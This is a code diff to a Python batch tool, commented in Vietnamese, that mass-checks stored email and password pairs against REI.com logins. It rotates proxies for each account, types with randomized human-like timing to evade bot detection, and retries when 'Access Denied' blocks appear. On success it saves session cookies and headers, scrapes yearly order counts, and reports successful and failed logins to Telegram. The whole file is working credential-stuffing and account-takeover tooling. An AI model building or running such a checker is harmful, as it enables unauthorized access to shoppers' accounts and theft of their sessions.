@@ -8,6 +8,8 @@ import json
 import shutil
 import sys
 import asyncio
+import logging
+from urllib.parse import urlsplit
 
 # Windows: cần ProactorEventLoop cho subprocess (Playwright) khi chạy trong thread
 if sys.platform.startswith("win"):
@@ -23,21 +25,26 @@ from ..models import Account, AccountYearStat
 from .session_store import save_cookies
 from .history_fetcher import fetch_orders_per_year_with_scrapy
 from .telegram_bot import send_message, send_photo, send_photo_bytes
+from .proxy_pool import get_working_proxy
 
 
 _worker_lock = threading.Lock()
 _worker_thread = None
+
+logger = logging.getLogger("batch")
 
 
 def _safe_key(email: str) -> str:
 	return email.lower().replace("@", "_at_").replace("/", "_").replace("\\", "_")
 
 
-def _parse_proxy() -> dict | None:
-	proxy = os.getenv("PROXY_SERVER") or os.getenv("HTTPS_PROXY") or os.getenv("HTTP_PROXY")
-	if not proxy:
-		return None
-	return {"server": proxy}
+def _pick_proxy_url() -> tuple[str | None, str | None]:
+	proxy, ip = get_working_proxy(max_rounds=1)
+	if proxy:
+		return proxy, ip
+	# fallback env
+	env_proxy = os.getenv("PROXY_SERVER") or os.getenv("HTTPS_PROXY") or os.getenv("HTTP_PROXY")
+	return (env_proxy or None), None
 
 
 def _humanize_page(page):
@@ -83,15 +90,15 @@ def _maybe_random_browse(page):
 
 
 def _slow_type(locator, value: str):
-	"""Gõ ký tự có độ trễ để giống người dùng (đã rút ngắn)."""
+	"""Gõ ký tự có độ trễ để giống người dùng (nhanh hơn)."""
 	try:
 		locator.click()
 		locator.fill("")
 		for ch in value:
-			locator.type(ch, delay=random.randint(40, 90))
-			# nghỉ ngắn thỉnh thoảng
-			if random.random() < 0.1:
-				locator.page.wait_for_timeout(random.randint(60, 120))
+			locator.type(ch, delay=random.randint(20, 60))
+			# nghỉ rất ngắn ngẫu nhiên
+			if random.random() < 0.08:
+				locator.page.wait_for_timeout(random.randint(30, 80))
 	except Exception:
 		# fallback fill nếu type thất bại
 		try:
@@ -100,9 +107,90 @@ def _slow_type(locator, value: str):
 			pass
 
 
-def _make_persistent_context(p, engine: str, headless: bool, slow_mo_ms: int, ua: str, viewport: dict, email: str):
+def _wait_login_page(page):
+	"""Chờ trang login ổn định: form #Logon và 2 field có mặt."""
+	page.wait_for_selector("#Logon", state="visible", timeout=20000)
+	page.wait_for_selector("#logonId", state="visible", timeout=10000)
+	page.wait_for_selector("#password", state="visible", timeout=10000)
+	# đợi network idle ngắn để hạn chế reload trong lúc gõ
+	try:
+		page.wait_for_load_state("networkidle", timeout=3000)
+	except Exception:
+		pass
+
+
+def _extract_login_error(page) -> str | None:
+    """Cố gắng trích xuất thông báo lỗi đăng nhập từ nhiều selector phổ biến."""
+    candidates = [
+        ".sr-only",
+        "[role='alert']",
+        ".alert",
+        ".error",
+        ".error-message",
+        ".form-group .help-block",
+        "#login-form .help-block",
+        "#Logon .help-block",
+    ]
+    for sel in candidates:
+        try:
+            loc = page.locator(sel).first
+            if loc.count() > 0:
+                # ưu tiên phần tử hiển thị
+                try:
+                    if loc.is_visible():
+                        txt = loc.inner_text(timeout=800)
+                        if txt and txt.strip():
+                            return txt.strip()[:500]
+                except Exception:
+                    pass
+                # fallback: lấy inner_text dù ẩn (sr-only)
+                try:
+                    txt = loc.inner_text(timeout=800)
+                    if txt and txt.strip():
+                        return txt.strip()[:500]
+                except Exception:
+                    pass
+        except Exception:
+            continue
+    # cuối cùng: lấy một đoạn từ body nếu có
+    try:
+        body_txt = page.locator("body").inner_text(timeout=800)
+        if body_txt and body_txt.strip():
+            return body_txt.strip()[:500]
+    except Exception:
+        pass
+    return None
+
+
+def _fill_with_retries(page, selector: str, value: str, use_typing: bool = True, retries: int = 3):
+	last_err = None
+	for _ in range(max(1, retries)):
+		try:
+			_wait_login_page(page)
+			loc = page.locator(selector)
+			if use_typing:
+				_slow_type(loc, value)
+			else:
+				loc.fill(value)
+			# xác nhận giá trị đã được điền (nếu có thể)
+			try:
+				current = page.locator(selector).input_value(timeout=1000)
+				if current:
+					return True
+			except Exception:
+				return True
+		except Exception as e:
+			last_err = e
+			# có thể trang vừa reload → thử lại
+			continue
+	if last_err:
+		raise last_err
+	return False
+
+
+def _make_persistent_context(p, engine: str, headless: bool, slow_mo_ms: int, ua: str, viewport: dict, email: str, playwright_proxy: dict | None):
 	launch = p.firefox.launch_persistent_context if engine == "firefox" else p.chromium.launch_persistent_context
-	proxy = _parse_proxy()
+	proxy = playwright_proxy
 	base_dir = os.getenv("PLAYWRIGHT_PROFILE_DIR", os.path.join(".playwright", "profiles"))
 	os.makedirs(base_dir, exist_ok=True)
 	user_dir = os.path.join(base_dir, _safe_key(email))
@@ -125,7 +213,7 @@ def _make_persistent_context(p, engine: str, headless: bool, slow_mo_ms: int, ua
 	return ctx, user_dir
 
 
-def _make_browser_and_context(p, engine: str, headless: bool, slow_mo_ms: int, email: str):
+def _make_browser_and_context(p, engine: str, headless: bool, slow_mo_ms: int, email: str, playwright_proxy: dict | None):
 	ua_firefox = (
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0"
 	)
@@ -137,9 +225,9 @@ def _make_browser_and_context(p, engine: str, headless: bool, slow_mo_ms: int, e
 	viewport = {"width": random.randint(1280, 1440), "height": random.randint(720, 950)}
 
 	profile_dir = None
-	proxy = _parse_proxy()
+	proxy = playwright_proxy
 	if os.getenv("PLAYWRIGHT_PERSIST", "0").lower() in ("1", "true", "yes"):
-		context, profile_dir = _make_persistent_context(p, engine, headless, slow_mo_ms, ua, viewport, email)
+		context, profile_dir = _make_persistent_context(p, engine, headless, slow_mo_ms, ua, viewport, email, proxy)
 		browser = context.browser
 	else:
 		browser = (p.firefox if engine == "firefox" else p.chromium).launch(
@@ -172,11 +260,11 @@ def _make_browser_and_context(p, engine: str, headless: bool, slow_mo_ms: int, e
 	return browser, context, page, profile_dir
 
 
-def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict], Dict[str, str]]:
+def _playwright_login_and_cookies(email: str, password: str) -> tuple[bool, list[dict], Dict[str, str], str | None]:
 	try:
 		from playwright.sync_api import sync_playwright
 	except ImportError:
-		return [], {}
+		return False, [], {}, None
 
 	headless_env = os.getenv("PLAYWRIGHT_HEADLESS")
 	if headless_env is None:
@@ -189,6 +277,36 @@ def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict]
 	persist_enabled = os.getenv("PLAYWRIGHT_PERSIST", "0").lower() in ("1", "true", "yes")
 
 	with sync_playwright() as p:
+		last_error_msg: str | None = None
+		# Chọn proxy 1 lần/ tài khoản, áp dụng cho cả các thử nghiệm (firefox -> chromium)
+		proxy_url, observed_ip = _pick_proxy_url()
+		# Xây dựng proxy cho Playwright: server chỉ host:port, tách username/password
+		playwright_proxy: dict | None = None
+		if proxy_url:
+			parsed = urlsplit(proxy_url)
+			host = parsed.hostname
+			port = parsed.port
+			if host and port:
+				scheme_override = os.getenv("PROXY_PLAYWRIGHT_SCHEME")
+				scheme = (scheme_override or parsed.scheme or "http").lower()
+				playwright_proxy = {
+					"server": f"{scheme}://{host}:{port}",
+				}
+				if parsed.username:
+					playwright_proxy["username"] = parsed.username
+				if parsed.password:
+					playwright_proxy["password"] = parsed.password
+		try:
+			if proxy_url:
+				if observed_ip:
+					send_message(f"[Proxy OK] {email} -> {proxy_url} | IP {observed_ip}")
+				else:
+					send_message(f"[Proxy Fallback] {email} -> {proxy_url}")
+			else:
+				send_message(f"[Proxy NONE] {email} -> không dùng proxy")
+		except Exception:
+			pass
+		logger.info("Proxy | email=%s | proxy=%s | ip=%s", email, proxy_url, observed_ip)
 		for engine in ("firefox", "chromium"):
 			browser = None
 			profile_dir = None
@@ -203,7 +321,7 @@ def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict]
 				ua_used = ua_firefox if engine == "firefox" else ua_chrome
 
 				browser, context, page, profile_dir = _make_browser_and_context(
-					p, engine, headless_default, slow_mo_ms, email
+					p, engine, headless_default, slow_mo_ms, email, playwright_proxy
 				)
 
 				# capture outgoing request headers for rei.com
@@ -236,6 +354,7 @@ def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict]
 					page.wait_for_url(lambda url: "/login" in url or "/user/login" in url, timeout=25000)
 				except Exception:
 					page.goto("https://www.rei.com/login?toUrl=/", wait_until="domcontentloaded")
+				_wait_login_page(page)
 
 				body_text = (page.locator("body").inner_text(timeout=3000) or "") if page else ""
 				if "Access Denied" in body_text:
@@ -248,9 +367,9 @@ def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict]
 						shutil.rmtree(profile_dir, ignore_errors=True)
 					continue
 
-				# type slowly
-				_slow_type(page.locator("#logonId"), email)
-				_slow_type(page.locator("#password"), password)
+				# nhập với retry để xử lý case trang reload giữa chừng
+				_fill_with_retries(page, "#logonId", email, use_typing=True, retries=4)
+				_fill_with_retries(page, "#password", password, use_typing=True, retries=4)
 				btn = page.locator("button[data-ui='button-submit']").first
 				if btn.count() == 0:
 					btn = page.locator("#Logon button[type=submit]").first
@@ -274,6 +393,11 @@ def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict]
 					page.wait_for_load_state("networkidle", timeout=25000)
 				except Exception:
 					page.wait_for_timeout(2000)
+				# sau submit, nếu bị redirect/refresh ngắn, chờ form biến mất
+				try:
+					page.wait_for_selector("#Logon", state="detached", timeout=5000)
+				except Exception:
+					pass
 
 				body_text = (page.locator("body").inner_text(timeout=3000) or "")
 				if "Access Denied" in body_text:
@@ -316,6 +440,15 @@ def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict]
 					if k.startswith("sec-"):
 						final_headers[k.title()] = headers_seen[k]
 
+				# Xác định login thành công dựa trên DOM 'Hi, '
+				login_ok = False
+				try:
+					hi_text = page.locator('.account-nav-button__span-container').inner_text(timeout=4000) or ''
+					if 'Hi' in hi_text:
+						login_ok = True
+				except Exception:
+					login_ok = False
+
 				if keep_open:
 					while browser.is_connected():
 						time.sleep(0.5)
@@ -323,7 +456,11 @@ def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict]
 					browser.close()
 				if persist_enabled and delete_profile and profile_dir and not keep_open:
 					shutil.rmtree(profile_dir, ignore_errors=True)
-				return cookies, final_headers
+				if not login_ok:
+					# trích xuất thông báo lỗi rõ ràng
+					err_text = _extract_login_error(page)
+					return False, [], {}, err_text
+				return True, cookies, final_headers, None
 			except Exception:
 				try:
 					if keep_open and browser is not None:
@@ -335,33 +472,66 @@ def _playwright_login_and_cookies(email: str, password: str) -> tuple[list[dict]
 					pass
 				if persist_enabled and delete_profile and profile_dir and not keep_open:
 					shutil.rmtree(profile_dir, ignore_errors=True)
+				# cố gắng lấy thông điệp lỗi từ page nếu có
+				try:
+					if 'page' in locals() and page:
+						last_error_msg = _extract_login_error(page)
+				except Exception:
+					last_error_msg = None
 				continue
-	return [], {}
+	return False, [], {}, last_error_msg
 
 
 def _fetch_orders_per_year(email: str, password: str):
-	cookies, headers = _playwright_login_and_cookies(email, password)
+	login_ok, cookies, headers, error_message = _playwright_login_and_cookies(email, password)
 	rei_cookies = [c for c in cookies if ".rei.com" in (c.get("domain") or "")]
-	can_login = len(rei_cookies) > 0
+	can_login = bool(login_ok and len(rei_cookies) > 0)
 	if not can_login:
-		return False, {}, [], {}
+		return False, {}, [], {}, {}, (error_message or "Login failed")
 
 	save_cookies(email, rei_cookies)
 
 	now = datetime.utcnow().year
 	years = list(range(2014, now + 1))
 
-	per_year_counts, raw_map = fetch_orders_per_year_with_scrapy(years, rei_cookies, headers=headers)
-	return True, per_year_counts, rei_cookies, headers, raw_map
+	# Dùng cùng proxy cho bước fetch như khi login để đồng nhất phiên/địa chỉ IP
+	per_year_counts, raw_map = fetch_orders_per_year_with_scrapy(years, rei_cookies, headers=headers, proxy_url=None)
+	return True, per_year_counts, rei_cookies, headers, raw_map, None
 
 
-def _process_accounts(app, emails: List[str]) -> None:
+def _process_accounts(app, emails: List[str], on_event=None) -> None:
 	with app.app_context():
 		for email in emails:
+			if on_event:
+				try:
+					on_event({"type": "start", "email": email})
+				except Exception:
+					pass
+			logger.info("Process account start | email=%s", email)
 			account = Account.query.filter_by(email=email).one_or_none()
 			if account is None:
+				logger.warning("Account not found | email=%s", email)
 				continue
-			can_login, per_year, cookies, headers, raw_map = _fetch_orders_per_year(account.email, account.password)
+			can_login, per_year, cookies, headers, raw_map, login_error = _fetch_orders_per_year(account.email, account.password)
+
+			# Nếu không đăng nhập được: đánh dấu thất bại và ghi thời điểm kiểm tra
+			if not can_login:
+				account.can_login = False
+				account.last_checked_at = datetime.utcnow()
+				account.error_message = login_error
+				try:
+					send_message(f"[Login FAIL] {email}")
+				except Exception:
+					pass
+				logger.info("Login FAIL | email=%s", email)
+				db.session.commit()
+				if on_event:
+					try:
+						on_event({"type": "result", "email": email, "can_login": False})
+					except Exception:
+						pass
+				time.sleep(0.1)
+				continue
 
 			total = 0
 			for year, count in (per_year or {}).items():
@@ -375,15 +545,15 @@ def _process_accounts(app, emails: List[str]) -> None:
 				if raw_map:
 					stat.raw_json = json.dumps(raw_map[year], ensure_ascii=False)
 
-			# Gửi log Telegram theo từng năm
 			try:
-				if per_year:
+				if per_year and can_login:
 					years_text = "\n".join([f"- {y}: {per_year[y]} đơn" for y in sorted(per_year.keys())])
 					send_message(f"Kết quả đơn hàng cho {email}:\n{years_text}\nTổng: {total}")
+					logger.info("Orders | email=%s | total=%s | years=%s", email, total, sorted(per_year.keys()))
 			except Exception:
 				pass
 
-			account.can_login = bool(can_login)
+			account.can_login = True
 			account.total_orders = int(total)
 			account.last_checked_at = datetime.utcnow()
 			if cookies:
@@ -396,7 +566,23 @@ def _process_accounts(app, emails: List[str]) -> None:
 					account.headers_json = json.dumps(headers, ensure_ascii=False)
 				except Exception:
 					pass
+			account.error_message = None
 			db.session.commit()
+			try:
+				send_message(f"[Login OK] {email} | Tổng đơn: {total}")
+			except Exception:
+				pass
+			logger.info("Login OK | email=%s | total=%s", email, total)
+			if on_event:
+				try:
+					on_event({
+						"type": "result",
+						"email": email,
+						"can_login": True,
+						"total": total,
+					})
+				except Exception:
+					pass
 			time.sleep(0.2)
 
 
@@ -408,6 +594,11 @@ def enqueue_accounts_check(emails: List[str]) -> None:
 
 	def target():
 		try:
+			try:
+				send_message(f"[Batch START] {len(emails)} tài khoản")
+			except Exception:
+				pass
+			logger.info("Batch START | accounts=%s", len(emails))
 			_process_accounts(app, emails)
 		finally:
 			global _worker_thread
@@ -424,4 +615,18 @@ def enqueue_accounts_check(emails: List[str]) -> None:
 def run_accounts_check_sync(emails: List[str]) -> None:
 	"""Chạy kiểm tra đồng bộ (blocking) cho danh sách emails."""
 	app = current_app._get_current_object()
-	_process_accounts(app, emails)
+	try:
+		send_message(f"[Batch START] {len(emails)} tài khoản (sync)")
+	except Exception:
+		pass
+	logger.info("Batch START (sync) | accounts=%s", len(emails))
+	def _printer(evt):
+		t = evt.get("type")
+		if t == "start":
+			print(f"[START] {evt.get('email')}")
+		elif t == "result":
+			if evt.get("can_login"):
+				print(f"[OK]    {evt.get('email')} | total={evt.get('total')}")
+			else:
+				print(f"[FAIL]  {evt.get('email')}")
+	_process_accounts(app, emails, on_event=_printer)
